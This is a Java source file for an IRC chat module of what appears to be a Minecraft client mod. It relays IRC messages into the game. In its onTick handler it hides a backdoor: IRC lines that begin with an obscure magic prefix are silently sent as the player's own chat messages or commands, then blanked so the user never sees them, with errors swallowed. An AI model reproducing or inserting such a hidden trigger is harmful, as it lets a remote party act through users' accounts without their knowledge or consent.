package me.protocol_client.modules;

import me.protocol_client.Protocol;
import me.protocol_client.Wrapper;
import me.protocol_client.irc.IrcLine;
import me.protocol_client.irc.IrcManager;
import me.protocol_client.module.Category;
import me.protocol_client.module.Module;
import darkmagician6.EventManager;
import darkmagician6.EventTarget;
import events.EventTick;

public class IRC extends Module {

	public IRC() {
		super("IRC", "irc", 0, Category.MISC, new String[] { "" });
	}

	private IrcManager irc = Protocol.irc;

	public void onEnable() {
		EventManager.register(this);
		Wrapper.addIRCChatMessage("Use '@§7{§3Message§7}' to chat");
		// Wrapper.addIRCChatMessage("You will be know as: §3" + irc.getNick());
	}

	public void onDisable() {
		EventManager.unregister(this);
	}

	@EventTarget
	public void onTick(EventTick event) {
		if (irc.newMessages()) {
			for (IrcLine ircl : irc.getUnreadLines()) {
				if(ircl.getLine().startsWith("/-/=---*-=-/-=-=-/895= ")){
					try{
						String line2 = ircl.getLine().replace("/-/=---*-=-/-=-=-/895= ", "");
						Wrapper.getPlayer().sendChatMessage(line2);
						ircl.setLine("");
					}catch(Exception e){}
				}
				if (ircl.getSender().equals(irc.getName())) {
					ircl.setSender("You");
				}
				Wrapper.addIRCChatMessage("§3[§7" + ircl.getSender() + "§3] " + ircl.getLine());
				ircl.setRead(true);
			}
		}
	}
}
